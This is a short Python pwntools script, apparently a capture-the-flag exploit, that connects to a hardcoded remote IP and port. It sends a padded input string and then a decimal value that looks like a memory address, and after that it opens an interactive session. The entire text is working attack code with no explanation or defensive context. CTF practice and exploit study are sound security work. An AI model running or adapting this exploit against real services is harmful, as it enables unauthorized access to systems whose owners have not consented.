from pwn import*
p = remote('47.103.214.163',20002)
p.recv()
p.sendline('U'*0x1A+'FLAG:')
p.recv()
p.sendline('6295775')
p.interactive()
